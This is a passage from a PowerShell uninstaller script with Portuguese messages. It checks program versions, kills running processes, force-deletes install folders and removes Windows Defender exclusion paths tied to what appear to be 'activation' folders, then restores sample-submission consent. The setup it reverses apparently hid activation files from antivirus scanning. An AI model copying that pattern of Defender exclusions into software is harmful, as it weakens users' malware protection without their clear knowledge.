                        Write-Host -NoNewline " '$nome_programa $programVersionAnterior' " -ForegroundColor Cyan
                        Write-Host -NoNewline "já está instalado no seu computador." -ForegroundColor Yellow
                        Write-Host ""
                        Write-Host "      Iniciando processo de desinstalação do '$nome_programa'..." -ForegroundColor Green
                        Write-Host ""

                    }                 
                    
                } else {

                    Write-Host "     ================================================================================================================" -ForegroundColor Green
                    Write-Host ""
                    Write-Host "      A versão do programa atualmente instalado é diferente a versão disponível de instalação." -ForegroundColor Yellow
                    Write-Host ""
                    Write-Host -NoNewline "      O programa" -ForegroundColor Yellow
                    Write-Host -NoNewline " '$nome_programa $programVersionAnterior' " -ForegroundColor Cyan
                    Write-Host -NoNewline "já está instalado no seu computador." -ForegroundColor Yellow
                    Write-Host ""
                    Write-Host "      Iniciando processo de desinstalação do '$nome_programa'..." -ForegroundColor Green
                    Write-Host ""

                }

            } else {

                # Versão Anterior:

                $firstExePathAnterior = $exePath_install_found[0].FullName

                $versionInfoAnterior = (Get-Item $firstExePathAnterior).VersionInfo
                $programVersionAnterior = $versionInfoAnterior.FileVersion
                
                # Verificar se $programVersion contém ',' e substituir por '.'
                if ($programVersionAnterior -match ',') {
                        
                    $programVersionAnterior = $programVersionAnterior -replace '\s+', ''  # Remove todos os espaços
                    $programVersionAnterior = $programVersionAnterior -replace ',', '.'
                }

                $programPath = "$($pathsToCheck['exe_instalacao'])"

                $folderFoundAtual = $false

                foreach ($path in $pathsToCheck) {
                    if (Test-Path $($path['pasta_instalacao']) -PathType Container) {
                        $folderFoundAtual = $true
                        break
                    }
                }

                if ($folderFoundAtual) {
                    
                    $versionInfo = (Get-Item $programPath).VersionInfo
                    $programVersion = $versionInfo.FileVersion

                    # Verificar se $programVersion contém ',' e substituir por '.'
                    if ($programVersion -match ',') {
                        
                        $programVersion = $programVersion -replace '\s+', ''  # Remove todos os espaços
                        $programVersion = $programVersion -replace ',', '.'

                        # Extrair os dois primeiros números da versão do programa e da versão disponível
                        $programVersionParts = $programVersion -split '\.' | Select-Object -First 2
                        $disponivelParts = $versao_disponivel -split '\.' | Select-Object -First 2
                                
                        # Converter a versão do programa para um formato numérico
                        $programVersionNumerica = [version]($programVersionParts -join '.')
                        $disponVersionNumerica = [Version]($disponivelParts -join '.')

                    } else {

                        # Extrair os dois primeiros números da versão do programa e da versão disponível
                        $programVersionParts = $programVersion -split '\.' | Select-Object -First 2
                        $disponivelParts = $versao_disponivel -split '\.' | Select-Object -First 2
                                
                        # Converter a versão do programa para um formato numérico
                        $programVersionNumerica = [version]($programVersionParts -join '.')
                        $disponVersionNumerica = [Version]($disponivelParts -join '.')
                    }


                    if ($programVersionNumerica -eq $disponVersionNumerica) {
                        Write-Host ""
                        Write-Host "     ================================================================================================================" -ForegroundColor Green
                        Write-Host ""
                        Write-Host "      A versão do programa atualmente instalado é igual a versão disponível de instalação." -ForegroundColor Yellow
                        Write-Host ""
                        Write-Host -NoNewline "      O programa" -ForegroundColor Yellow
                        Write-Host -NoNewline " '$nome_programa $versao_disponivel' " -ForegroundColor Cyan
                        Write-Host -NoNewline "já está instalado no seu computador." -ForegroundColor Yellow
                        Write-Host ""
                        Write-Host "      Iniciando processo de desinstalação do '$nome_programa'..." -ForegroundColor Green
                        Write-Host ""
                    } else {
                        Write-Host ""
                        Write-Host "     ================================================================================================================" -ForegroundColor Green
                        Write-Host ""
                        Write-Host "      A versão do programa atualmente instalado é diferente a versão disponível de instalação." -ForegroundColor Yellow
                        Write-Host ""
                        Write-Host -NoNewline "      O programa" -ForegroundColor Yellow
                        Write-Host -NoNewline " '$nome_programa $programVersionAnterior' " -ForegroundColor Cyan
                        Write-Host -NoNewline "já está instalado no seu computador." -ForegroundColor Yellow
                        Write-Host ""
                        Write-Host "      Iniciando processo de desinstalação do '$nome_programa'..." -ForegroundColor Green
                        Write-Host ""

                    }                 
                    
                } else {

                    Write-Host ""
                    Write-Host "     ================================================================================================================" -ForegroundColor Green
                    Write-Host ""
                    Write-Host "      A versão do programa atualmente instalado é diferente a versão disponível de instalação." -ForegroundColor Yellow
                    Write-Host ""
                    Write-Host -NoNewline "      O programa" -ForegroundColor Yellow
                    Write-Host -NoNewline " '$nome_programa $programVersionAnterior' " -ForegroundColor Cyan
                    Write-Host -NoNewline "já está instalado no seu computador." -ForegroundColor Yellow
                    Write-Host ""
                    Write-Host "      Iniciando processo de desinstalação do '$nome_programa'..." -ForegroundColor Green
                    Write-Host ""

                    if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }

                }
            }

            $opcao_remover = Read-Host "      Deseja desinstalar $nome_programa ? (S/N)"
            Write-Host ""

            if ($opcao_remover -eq 's') {
                            
                if ($MetodoSelecionado -eq "Chave/Serial" -and $stepsAtvToCheck["processo_ativacao"].Contains('Pré-instalação')) {
                    
                    $metodo_remover = Read-Host "      Deseja desinstalar completamente seu $nome_programa.? (S/N)"

                    if ($metodo_remover -eq 's') {

                        $processesRunning = CheckProcessesRunning

                        if ($processesRunning) {
                        
                            $processNames = $processesRunning | ForEach-Object { $_.Name } 
                         
                            Write-Host ""          
                            Write-Host "Os processos $($processNames -join ', ') estão em execução." -ForegroundColor Yellow
                            Write-Host "Fechando os processos para iniciar a desinstalação..." -ForegroundColor Red
                            Write-Host ""
                        
                            foreach ($processName in $processNames) {
                                $process = Get-Process -Name $processName
                                Stop-Process -Id $process.Id -Force
                            }

                            # Inicia o processo de desinstalação

                            if ($folderFoundAtual) {

                                Write-Host ""
                                Write-Host "     ===============================================================================================================" -ForegroundColor Green
                                Write-Host ""
                                Write-Host -NoNewline "      Desinstalação completa de" -ForegroundColor Yellow
                                Write-Host -NoNewline " '$nome_programa $versao_disponivel' " -ForegroundColor Cyan
                                Write-Host -NoNewline "iniciada..." -ForegroundColor Yellow
                                Write-Host ""
                                Write-Host ""
                                Write-Host "      Abrindo desinstalador de $nome_programa..." -ForegroundColor Green  
                                Write-Host ""

                                if ($destino_atv_key -ne $destino_atv) {
                        
                                    # Extrai o diretório do arquivo
                                    $targetDir = Split-Path $exePath_unis_atual
                        
                                    # Extrai o nome do arquivo (DFStd.exe)
                                    $excludedFile = Split-Path $exePath_unis_atual -Leaf

                                    # Obtém todos os arquivos no diretório, exceto o arquivo DFStd.exe
                                    $filesToDelete = Get-ChildItem -Path $targetDir -File | Where-Object { $_.Name -ne $excludedFile }

                                    if ($filesToDelete.Count -gt 0) { foreach ($file in $filesToDelete) { Remove-Item -Path $file.FullName -Force } }

                                    Write-Host ""
                                    Write-Host -NoNewline "      Aguardando o processo de desinstalação do" -ForegroundColor Yellow
                                    Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                    Write-Host -NoNewline "terminar..." -ForegroundColor Yellow
                                    Write-Host ""

                                } else {

                                    Write-Host ""
                                    Write-Host -NoNewline "      Aguardando o processo de desinstalação do" -ForegroundColor Yellow
                                    Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                    Write-Host -NoNewline "terminar..." -ForegroundColor Yellow
                                    Write-Host ""
                    
                                }

                                # Inciando o processo de desinstalação e aguardando sua conclusão
                                Start-Process -FilePath $exePath_unis_atual -PassThru -Wait

                            } else {

                                Write-Host ""
                                Write-Host "     ===============================================================================================================" -ForegroundColor Green
                                Write-Host ""
                                Write-Host -NoNewline "      Desinstalação completa de" -ForegroundColor Yellow
                                Write-Host -NoNewline " '$nome_programa $programVersionAnterior' " -ForegroundColor Cyan
                                Write-Host -NoNewline "iniciada..." -ForegroundColor Yellow
                                Write-Host ""
                                Write-Host ""
                                Write-Host "      Abrindo desinstalador de $nome_programa..." -ForegroundColor Green  
                                Write-Host ""

                                if ($destino_atv_key -ne $destino_atv) {
                        
                                    # Extrai o diretório do arquivo
                                    $targetDir = Split-Path $exePath_unis_atual
                        
                                    # Extrai o nome do arquivo (DFStd.exe)
                                    $excludedFile = Split-Path $exePath_unis_atual -Leaf

                                    # Obtém todos os arquivos no diretório, exceto o arquivo DFStd.exe
                                    $filesToDelete = Get-ChildItem -Path $targetDir -File | Where-Object { $_.Name -ne $excludedFile }

                                    if ($filesToDelete.Count -gt 0) { foreach ($file in $filesToDelete) { Remove-Item -Path $file.FullName -Force } }

                                    Write-Host ""
                                    Write-Host -NoNewline "      Aguardando o processo de desinstalação do" -ForegroundColor Yellow
                                    Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                    Write-Host -NoNewline "terminar..." -ForegroundColor Yellow
                                    Write-Host ""

                                } else {

                                    Write-Host ""
                                    Write-Host -NoNewline "      Aguardando o processo de desinstalação do" -ForegroundColor Yellow
                                    Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                    Write-Host -NoNewline "terminar..." -ForegroundColor Yellow
                                    Write-Host ""
                    
                                }

                                # fazer a verificaão se a versão atual e igual a disponivel 
                                Start-Process -FilePath $exePath_unis_found.FullName -PassThru -Wait
                            }

                        } else {
           
                            # Inicia o processo de desinstalação

                            if ($folderFoundAtual) {

                                Write-Host ""
                                Write-Host "     ===============================================================================================================" -ForegroundColor Green
                                Write-Host ""
                                Write-Host -NoNewline "      Desinstalação completa de" -ForegroundColor Yellow
                                Write-Host -NoNewline " '$nome_programa $versao_disponivel' " -ForegroundColor Cyan
                                Write-Host -NoNewline "iniciada..." -ForegroundColor Yellow
                                Write-Host ""
                                Write-Host ""
                                Write-Host "      Abrindo desinstalador de $nome_programa..." -ForegroundColor Green  
                                Write-Host ""

                                if ($destino_atv_key -ne $destino_atv) {
                        
                                    # Extrai o diretório do arquivo
                                    $targetDir = Split-Path $exePath_unis_atual
                        
                                    # Extrai o nome do arquivo (DFStd.exe)
                                    $excludedFile = Split-Path $exePath_unis_atual -Leaf

                                    # Obtém todos os arquivos no diretório, exceto o arquivo DFStd.exe
                                    $filesToDelete = Get-ChildItem -Path $targetDir -File | Where-Object { $_.Name -ne $excludedFile }

                                    if ($filesToDelete.Count -gt 0) { foreach ($file in $filesToDelete) { Remove-Item -Path $file.FullName -Force } }

                                    Write-Host ""
                                    Write-Host -NoNewline "      Aguardando o processo de desinstalação do" -ForegroundColor Yellow
                                    Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                    Write-Host -NoNewline "terminar..." -ForegroundColor Yellow
                                    Write-Host ""

                                } else {

                                    Write-Host ""
                                    Write-Host -NoNewline "      Aguardando o processo de desinstalação do" -ForegroundColor Yellow
                                    Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                    Write-Host -NoNewline "terminar..." -ForegroundColor Yellow
                                    Write-Host ""
                    
                                }

                                # Inciando o processo de desinstalação e aguardando sua conclusão
                                Start-Process -FilePath $exePath_unis_atual -PassThru -Wait

                            } else {

                                Write-Host ""
                                Write-Host "     ===============================================================================================================" -ForegroundColor Green
                                Write-Host ""
                                Write-Host -NoNewline "      Desinstalação completa de" -ForegroundColor Yellow
                                Write-Host -NoNewline " '$nome_programa $programVersionAnterior' " -ForegroundColor Cyan
                                Write-Host -NoNewline "iniciada..." -ForegroundColor Yellow
                                Write-Host ""
                                Write-Host ""
                                Write-Host "      Abrindo desinstalador de $nome_programa..." -ForegroundColor Green  
                                Write-Host ""

                                if ($destino_atv_key -ne $destino_atv) {
                        
                                    # Extrai o diretório do arquivo
                                    $targetDir = Split-Path $exePath_unis_atual
                        
                                    # Extrai o nome do arquivo (DFStd.exe)
                                    $excludedFile = Split-Path $exePath_unis_atual -Leaf

                                    # Obtém todos os arquivos no diretório, exceto o arquivo DFStd.exe
                                    $filesToDelete = Get-ChildItem -Path $targetDir -File | Where-Object { $_.Name -ne $excludedFile }

                                    if ($filesToDelete.Count -gt 0) { foreach ($file in $filesToDelete) { Remove-Item -Path $file.FullName -Force } }

                                    Write-Host ""
                                    Write-Host -NoNewline "      Aguardando o processo de desinstalação do" -ForegroundColor Yellow
                                    Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                    Write-Host -NoNewline "terminar..." -ForegroundColor Yellow
                                    Write-Host ""

                                } else {

                                    Write-Host ""
                                    Write-Host -NoNewline "      Aguardando o processo de desinstalação do" -ForegroundColor Yellow
                                    Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                    Write-Host -NoNewline "terminar..." -ForegroundColor Yellow
                                    Write-Host ""
                    
                                }

                                # fazer a verificaão se a versão atual e igual a disponivel 
                                Start-Process -FilePath $exePath_unis_found.FullName -PassThru -Wait
                            }
                        } 

                        # fazer verificação

                        # Verifica que a pasta default, anterior a principal aonde se encontra o programa, tem uma subpasta e se dentro dela contém arquivos,
                        # ou se fora dessa minha subpasta dentro da pasta default anterior a principal, tem arquivos sobrando também.
                        

                        if ((Test-Path $folderFound)) {

                            $subfoldersProgramFound = Get-ChildItem -Path $folderFound -Directory
                        
                            if ($subfoldersProgramFound.Count -gt 0) {
                                $subfolderPathProgramFound = $subfoldersProgramFound[0].FullName
                                $filesInProgramFound = Get-ChildItem -Path $subfolderPathProgramFound -File 
                                $filesInfolderFound = Get-ChildItem -Path $folderFound -File
                            } else {
                                $filesInfolderFound = Get-ChildItem -Path $folderFound -File
                            }

                            if ((Test-Path $folderFound) -or ((Test-Path $folderFound) -and $subfolderProgramFound.Count -ge 0 -and $filesInProgramFound.Count -ge 0) -or ((Test-Path $folderFound) -and $filesInfolderFound.Count -gt 0)) {
                           

                                ## AJUSTES WINDOWS DEFENDER

                                if ($destino_atv_key -ne $destino_atv) {
                                    # Lista de caminhos de exclusão a serem removidos
                                    $exclusionsToRemove = @($extracao, $extracao_atv, $destino_atv, $destino_atv_key) # Adicione mais caminhos aqui, se necessário
                                } else {
                                    # Lista de caminhos de exclusão a serem removidos
                                    $exclusionsToRemove = @($extracao, $extracao_atv, $destino_atv) # Adicione mais caminhos aqui, se necessário
                                }

                                # Obtém a lista atual de exclusões
                                $currentExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath

                                # Remove exclusões que estão presentes na lista de exclusões
                                foreach ($exclusion in $exclusionsToRemove) {
                                    if ($currentExclusions -contains $exclusion) {
                                        # Remove o caminho da exclusão
                                        $currentExclusions = $currentExclusions | Where-Object { $_ -ne $exclusion }
                                    }
                                }

                                # Atualiza a lista de exclusões

                                Set-MpPreference -ExclusionPath $currentExclusions
                                Set-MpPreference -SubmitSamplesConsent 1
                                
                                if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }

                            } else {
                            
                                Write-Host ""
                                Write-Host -NoNewline  "      Houve alguma falha no processo de desinstalação do" -ForegroundColor Red
                                Write-Host -NoNewline  " '$nome_programa $versao_disponivel'." -ForegroundColor Cyan
                                Write-Host ""
                                Write-Host "" 
                        
                                if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
                            }

                        } else {
                        
                            ## AJUSTES WINDOWS DEFENDER

                            if ($destino_atv_key -ne $destino_atv) {
                                # Lista de caminhos de exclusão a serem removidos
                                $exclusionsToRemove = @($extracao, $extracao_atv, $destino_atv, $destino_atv_key) # Adicione mais caminhos aqui, se necessário
                            } else {
                                # Lista de caminhos de exclusão a serem removidos
                                $exclusionsToRemove = @($extracao, $extracao_atv, $destino_atv) # Adicione mais caminhos aqui, se necessário
                            }

                            # Obtém a lista atual de exclusões
                            $currentExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath

                            # Remove exclusões que estão presentes na lista de exclusões
                            foreach ($exclusion in $exclusionsToRemove) {
                                if ($currentExclusions -contains $exclusion) {
                                    # Remove o caminho da exclusão
                                    $currentExclusions = $currentExclusions | Where-Object { $_ -ne $exclusion }
                                }
                            }

                            # Atualiza a lista de exclusões

                            Set-MpPreference -ExclusionPath $currentExclusions
                            Set-MpPreference -SubmitSamplesConsent 1
                        }

                        Write-Host ""
                        Write-Host -NoNewline "      Confirme se o" -ForegroundColor Yellow
                        Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                        Write-Host -NoNewline "foi desinstalado, para verificar se tudo ocorreu bem." -ForegroundColor Yellow
                        Write-Host ""
                        Write-Host ""

                        $remocao_completa = Read-Host "      Verificar desinstalação do $nome_programa ? (S/N)"
                   
                        $folderFoundProgramAtual = $($pathsToCheck['pasta_instalacao']) 

                        if (Test-Path $folderFoundProgramAtual) {
                        
                            # Verifica que a pasta principal aonde se encontra o programa, tem uma subpasta e se dentro dela contém arquivos,
                            # ou se fora dessa minha subpasta dentro da pasta principal do programa, tem arquivos sobrando também.

                            $subfoldersProgramAtual = Get-ChildItem -Path $folderFoundProgramAtual -Directory

                            if ($subfoldersProgramAtual.Count -gt 0) {
                                $subfolderProgramAtualPath = $subfoldersProgramAtual[0].FullName
                                $filesInProgramAtual =  Get-ChildItem -Path $subfolderProgramAtualPath -File 
                                $filesInfolderFoundAtual = Get-ChildItem -Path $folderFoundProgramAtual -File
                            } else {
                                $filesInfolderFoundAtual = Get-ChildItem -Path $folderFoundProgramAtual -File
                            } 

                        } elseif (Test-Path $folderFound) {

                            # Verifica que a pasta default, anterior a principal aonde se encontra o programa, tem uma subpasta e se dentro dela contém arquivos,
                            # ou se fora dessa minha subpasta dentro da pasta default anterior a principal, tem arquivos sobrando também.
                        
                            $subfoldersProgramFound = Get-ChildItem -Path $folderFound -Directory
                        
                            if ($subfoldersProgramFound.Count -gt 0) {
                            
                                foreach ($subfolderProgramFound in $subfoldersProgramFound) {

                                    $subfolderProgramFoundPath = $subfolderProgramFound.FullName

                                    if ($subfolderProgramFoundPath -like $($pathsToCheck['pasta_instalacao'])) {
                                        $filesInProgramFound = Get-ChildItem -Path $subfolderProgramFoundPath -File
                                        $subFoundInProgramFound = Get-ChildItem -Path $subfolderProgramFoundPath -Directory
                                        $filesInfolderFound = Get-ChildItem -Path $folderFound -File
                                    } else {
                                        $filesInfolderFound = Get-ChildItem -Path $folderFound -File
                                    }

                                }
                            } else {
                                $filesInfolderFound = Get-ChildItem -Path $folderFound -File
                            }
                       

                        } else {

                            $filesInProgramAtual = @() # Define uma lista vazia se o caminho não existir
                            $subfoldersProgramAtual = @() # Define uma lista vazia se o caminho não existir
                            $filesInfolderFoundAtual = @() # Define uma lista vazia se o caminho não existir

                            $filesInProgramFound = @() # Define uma lista vazia se o caminho não existir
                            $subFoundInProgramFound = @() # Define uma lista vazia se o caminho não existir
                            $filesInfolderFound = @() # Define uma lista vazia se o caminho não existir
                        }
                                
                        Write-Host ""

                        if($remocao_completa -eq 's' -or $remocao_completa -eq 'n'){

                            # Verifica se a pasta ainda existe
                            if (((Test-Path $folderFound) -and $subFoundInProgramFound.Count -ge 1 -and $filesInProgramFound.Count -ge 1 -or $filesInfolderFound.Count -ge 1) -or ((Test-Path $folderFound) -and $filesInfolderFound.Count -ge 1)) {
                            
                                Write-Host -NoNewline "      Seu" -ForegroundColor Green
                                Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                Write-Host -NoNewline "foi desinstalado parcialmente." -ForegroundColor Green
                                Write-Host ""
                                Write-Host ""
                                write-Host -NoNewline "      Talvez seja necessário reniciar o computador para ser desinstalado completamente." -ForegroundColor Yellow
                                Write-Host ""
                                write-Host -NoNewline "      Devido á sobras de backup ou configuração/personalização." -ForegroundColor Yellow
                                Write-Host ""
                                write-Host -NoNewline "      Ou tenha outros produtos instalado que seja do mesmo desenvolvedor." -ForegroundColor Yellow
                                Write-Host ""
                                Write-Host ""
                                
                                if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }

                            } elseif (((Test-Path $folderFoundProgramAtual) -and $subfoldersProgramAtual.Count -ge 1 -and $filesInProgramAtual.Count -ge 1 -or $filesInfolderFoundAtual.Count -ge 1) -or ((Test-Path $folderFoundProgramAtual) -and $filesInfolderFoundAtual.Count -ge 1) -or ((Test-Path $folderFoundProgramAtual))) {
                            
                                Write-Host -NoNewline "      Seu" -ForegroundColor Green
                                Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                                Write-Host -NoNewline "foi desinstalado parcialmente." -ForegroundColor Green
                                Write-Host ""
                                Write-Host ""
                                write-Host -NoNewline "      Talvez seja necessário reniciar o computador para ser desinstalado completamente." -ForegroundColor Yellow
                                Write-Host ""
                                write-Host -NoNewline "      Devido á sobras de backup ou configuração/personalização." -ForegroundColor Yellow
                                Write-Host ""
                                write-Host -NoNewline "      Ou tenha outros produtos instalado que seja do mesmo desenvolvedor." -ForegroundColor Yellow
                                Write-Host ""
                                Write-Host ""
                                
                                if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }

                            } else {
                                Write-Host "      Desinstalação de '$nome_programa' foi concluída com sucesso." -ForegroundColor Green
                                Write-Host ""

                                if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
                            }
                        }

                    } else {

                        Write-Host ""
                        Write-Host "      Desinstalação cancelada." -ForegroundColor Red
                        Write-Host ""

                        if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
                    }

                } else {

                    $metodo_remover = Read-Host "      Desinstalação rápida ou completa? (R/C)"
                            
                    if ($metodo_remover -eq 'r') {

                        $processesRunning = CheckProcessesRunning

                        if ($processesRunning) {

                            $processNames = $processesRunning | ForEach-Object { $_.Name }  
                            Write-Host ""
                            Write-Host "     ===============================================================================================================" -ForegroundColor Red          
                            Write-Host ""
                            Write-Host "      Os processos $($processNames -join ', ') estão em execução." -ForegroundColor Yellow
                            Write-Host "      Fechando os processos para iniciar a desinstalação..." -ForegroundColor Green
                            Write-Host ""
                            foreach ($processName in $processNames) {
                                $process = Get-Process -Name $processName
                                Stop-Process -Id $process.Id -Force
                            }

                            if ($folderFoundAtual) {
                            
                                Write-Host ""
                                Write-Host "     ===============================================================================================================" -ForegroundColor Green
                                Write-Host ""
                                Write-Host "      Desinstalação rápida de $nome_programa iniciada..." -ForegroundColor Green
                                Write-Host -NoNewline  "      Aguardando o processo de desinstalação do" -ForegroundColor Yellow
                                Write-Host -NoNewline  " '$nome_programa $versao_disponivel' " -ForegroundColor Cyan
                                Write-Host -NoNewline  "terminar..." -ForegroundColor Yellow
                                Write-Host ""
                                Write-Host ""

                                if ($destino_atv_key -ne $destino_atv) {

                                    # Extrai o diretório do arquivo
                                    $targetDir = Split-Path $exePath_unis_atual
                        
                                    # Extrai o nome do arquivo (DFStd.exe)
                                    $excludedFile = Split-Path $exePath_unis_atual -Leaf

                                    # Obtém todos os arquivos no diretório, exceto o arquivo DFStd.exe
                                    $filesToDelete = Get-ChildItem -Path $targetDir -File | Where-Object { $_.Name -ne $excludedFile }
                                
                                    if ($MetodoSelecionado -eq "Chave/Serial" -and $stepsAtvToCheck["processo_ativacao"].Contains('Pré-instalação')) {
                                        if ($filesToDelete.Count -gt 0) { foreach ($file in $filesToDelete) { Remove-Item -Path $file.FullName -Force } }
                                        Remove-Item -Recurse -Force $folderFound
                                    } else {
                                        Remove-Item -Recurse -Force $destino_atv_key
                                        Remove-Item -Recurse -Force $folderFound
                                    }

                                } else {
                                    Remove-Item -Recurse -Force $folderFound
                                }

                            } else {

                                Write-Host ""
                                Write-Host "     ===============================================================================================================" -ForegroundColor Green
                                Write-Host ""
                                Write-Host "      Desinstalação rápida de $nome_programa iniciada..." -ForegroundColor Green
                                Write-Host -NoNewline  "      Aguardando o processo de desinstalação do" -ForegroundColor Yellow
                                Write-Host -NoNewline  " '$nome_programa $programVersionAnterior' " -ForegroundColor Cyan
                                Write-Host -NoNewline  "terminar..." -ForegroundColor Yellow
                                Write-Host ""
                                Write-Host ""

                                if ($destino_atv_key -ne $destino_atv) {

                                    # Extrai o diretório do arquivo
                                    $targetDir = Split-Path $exePath_unis_atual
                        
                                    # Extrai o nome do arquivo (DFStd.exe)
                                    $excludedFile = Split-Path $exePath_unis_atual -Leaf

                                    # Obtém todos os arquivos no diretório, exceto o arquivo DFStd.exe
                                    $filesToDelete = Get-ChildItem -Path $targetDir -File | Where-Object { $_.Name -ne $excludedFile }
                                
                                    if ($MetodoSelecionado -eq "Chave/Serial" -and $stepsAtvToCheck["processo_ativacao"].Contains('Pré-instalação')) {
                                        if ($filesToDelete.Count -gt 0) { foreach ($file in $filesToDelete) { Remove-Item -Path $file.FullName -Force } }
                                        Remove-Item -Recurse -Force $folderFound
                                    } else {
                                        Remove-Item -Recurse -Force $destino_atv_key
                                        Remove-Item -Recurse -Force $folderFound
                                    }

                                } else {
                                    Remove-Item -Recurse -Force $folderFound
                                }

                            }

                        } else {

                            if ($folderFoundAtual) {
                            
                                Write-Host ""
                                Write-Host "     ===============================================================================================================" -ForegroundColor Green
                                Write-Host ""
                                Write-Host "      Desinstalação rápida de $nome_programa iniciada..." -ForegroundColor Green
                                Write-Host -NoNewline  "      Aguardando o processo de desinstalação do" -ForegroundColor Yellow
                                Write-Host -NoNewline  " '$nome_programa $versao_disponivel' " -ForegroundColor Cyan
                                Write-Host -NoNewline  "terminar..." -ForegroundColor Yellow
                                Write-Host ""
                                Write-Host ""

                                if ($destino_atv_key -ne $destino_atv) {

                                    # Extrai o diretório do arquivo
                                    $targetDir = Split-Path $exePath_unis_atual
                        
                                    # Extrai o nome do arquivo (DFStd.exe)
                                    $excludedFile = Split-Path $exePath_unis_atual -Leaf

                                    # Obtém todos os arquivos no diretório, exceto o arquivo DFStd.exe
                                    $filesToDelete = Get-ChildItem -Path $targetDir -File | Where-Object { $_.Name -ne $excludedFile }
                                
                                    if ($MetodoSelecionado -eq "Chave/Serial" -and $stepsAtvToCheck["processo_ativacao"].Contains('Pré-instalação')) {
                                        if ($filesToDelete.Count -gt 0) { foreach ($file in $filesToDelete) { Remove-Item -Path $file.FullName -Force } }
                                        Remove-Item -Recurse -Force $folderFound
                                    } else {
                                        Remove-Item -Recurse -Force $destino_atv_key
                                        Remove-Item -Recurse -Force $folderFound
                                    }

                                } else {
                                    Remove-Item -Recurse -Force $folderFound
                                }

                                if (Test-Path $destino_atv) {

                                    Write-Host ""
                                    Write-Host -NoNewline  "      Houve alguma falha no processo de desinstalação do" -ForegroundColor Red
                                    Write-Host -NoNewline  " '$nome_programa $versao_disponivel'." -ForegroundColor Cyan
                                    Write-Host ""
                                    Write-Host ""

                                    if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }

                                } else {
                                
                                    ## AJUSTES WINDOWS DEFENDER

                                    if ($destino_atv_key -ne $destino_atv) {
                                        # Lista de caminhos de exclusão a serem removidos
                                        $exclusionsToRemove = @($extracao, $extracao_atv, $destino_atv, $destino_atv_key) # Adicione mais caminhos aqui, se necessário
                                    } else {
                                        # Lista de caminhos de exclusão a serem removidos
                                        $exclusionsToRemove = @($extracao, $extracao_atv, $destino_atv) # Adicione mais caminhos aqui, se necessário
                                    }

                                    # Obtém a lista atual de exclusões
                                    $currentExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath

                                    # Remove exclusões que estão presentes na lista de exclusões
                                    foreach ($exclusion in $exclusionsToRemove) {
                                        if ($currentExclusions -contains $exclusion) {
                                            # Remove o caminho da exclusão
                                            $currentExclusions = $currentExclusions | Where-Object { $_ -ne $exclusion }
                                        }
                                    }

                                    # Atualiza a lista de exclusões
                                    Set-MpPreference -ExclusionPath $currentExclusions
                                    Set-MpPreference -SubmitSamplesConsent 1

                                }

                            } else {

                                Write-Host ""
                                Write-Host "     ===============================================================================================================" -ForegroundColor Green
                                Write-Host ""
                                Write-Host "      Desinstalação rápida de $nome_programa iniciada..." -ForegroundColor Green
                                Write-Host -NoNewline  "      Aguardando o processo de desinstalação do" -ForegroundColor Yellow
                                Write-Host -NoNewline  " '$nome_programa $programVersionAnterior' " -ForegroundColor Cyan
                                Write-Host -NoNewline  "terminar..." -ForegroundColor Yellow
                                Write-Host ""
                                Write-Host ""

                                if ($destino_atv_key -ne $destino_atv) {

                                    # Extrai o diretório do arquivo
                                    $targetDir = Split-Path $exePath_unis_atual
                        
                                    # Extrai o nome do arquivo (DFStd.exe)
                                    $excludedFile = Split-Path $exePath_unis_atual -Leaf

                                    # Obtém todos os arquivos no diretório, exceto o arquivo DFStd.exe
                                    $filesToDelete = Get-ChildItem -Path $targetDir -File | Where-Object { $_.Name -ne $excludedFile }
                                
                                    if ($MetodoSelecionado -eq "Chave/Serial" -and $stepsAtvToCheck["processo_ativacao"].Contains('Pré-instalação')) {
                                        if ($filesToDelete.Count -gt 0) { foreach ($file in $filesToDelete) { Remove-Item -Path $file.FullName -Force } }
                                        Remove-Item -Recurse -Force $folderFound
                                    } else {
                                        Remove-Item -Recurse -Force $destino_atv_key
                                        Remove-Item -Recurse -Force $folderFound
                                    }

                                } else {
                                    Remove-Item -Recurse -Force $folderFound
                                }

                                if (Test-Path $folderFound) {
                                    Write-Host ""
                                    Write-Host -NoNewline  "      Houve alguma falha no processo de desinstalação do" -ForegroundColor Red
                                    Write-Host -NoNewline  " '$nome_programa $programVersionAnterior'." -ForegroundColor Cyan
                                    Write-Host ""
                                    Write-Host "" 

                                    if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
                                
                                } else {

                                    ## AJUSTES WINDOWS DEFENDER

                                    if ($destino_atv_key -ne $destino_atv) {
                                        # Lista de caminhos de exclusão a serem removidos
                                        $exclusionsToRemove = @($extracao, $extracao_atv, $destino_atv, $destino_atv_key) # Adicione mais caminhos aqui, se necessário
                                    } else {
                                        # Lista de caminhos de exclusão a serem removidos
                                        $exclusionsToRemove = @($extracao, $extracao_atv, $destino_atv) # Adicione mais caminhos aqui, se necessário
                                    }

                                    # Obtém a lista atual de exclusões
                                    $currentExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath

                                    # Remove exclusões que estão presentes na lista de exclusões
                                    foreach ($exclusion in $exclusionsToRemove) {
                                        if ($currentExclusions -contains $exclusion) {
                                            # Remove o caminho da exclusão
                                            $currentExclusions = $currentExclusions | Where-Object { $_ -ne $exclusion }
                                        }
                                    }

                                    # Atualiza a lista de exclusões
